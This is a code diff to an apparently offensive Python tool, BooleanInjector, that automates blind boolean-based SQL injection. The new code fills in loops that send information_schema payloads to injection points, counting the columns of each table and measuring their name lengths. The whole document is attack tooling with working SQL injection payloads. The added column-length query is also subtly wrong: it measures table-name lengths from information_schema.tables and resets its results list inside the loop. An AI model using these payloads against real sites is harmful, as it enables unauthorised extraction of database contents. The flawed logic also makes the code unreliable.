@@ -59,7 +59,9 @@ class BooleanInjector:
 
         self.db_length = 0
         self.db_name = ""
-        self.tables, self.columns, self.rows = [], [], []
+
+        self.tables = []
+        self.columns, self.rows= {}, {}
 
         self.test_injection_points()
 
@@ -156,7 +158,8 @@ class BooleanInjector:
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got database name length:", "light_green"),
                           colored(f"{length}", "light_yellow"),
-                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}")
+                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
+                          if self.show_payload else "\n")
                     self.db_length = length
                     return length
         print(get_time(), fatal, colored("Unable to get database name length.", "red"))
@@ -238,25 +241,27 @@ class BooleanInjector:
 
     # @restrict_values(self.tables)
     def get_columns(self, witch_table: str = "all"):
-
-        columns_length, columns_count = [], []
-        print(self.tables)
+        columns_length, columns_count = {}, {}
         for point in range(0, self.params_count):
             # get column count
             for table in self.tables:
                 for c in range(1, 32):
                     payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0) #"
                     if self.get_payload_result(payload, point):
-                        columns_count.append(c)
+                        columns_count[table] = c
                         print(get_time(), info, colored(f"Got table[{table}] columns count: {c}"),
                               end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
                         break
-            # got all column counts in every table, then get column name length
-            for column in :
-                for length in range(1, 32):
-                    payload = f""
-                    if self.get_payload_result(payload, point):
-                        columns_length.append(length)
+                # got all column counts in every table, then get column name length
+                for column in range(0, columns_count[table]):
+                    columns_length[table] = []
+                    for length in range(1, 32):
+                        payload = f"and if((select length(table_name) from information_schema.tables where table_schema=database() limit {column},1)={length},1,0) %23"
+                        if self.get_payload_result(payload, point):
+                            columns_length[table].append(length)
+                            print(get_time(), info, colored(f"Got table[{table}] No.{column} column length: {length}"),
+                                  end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
+                            break
 
 
 
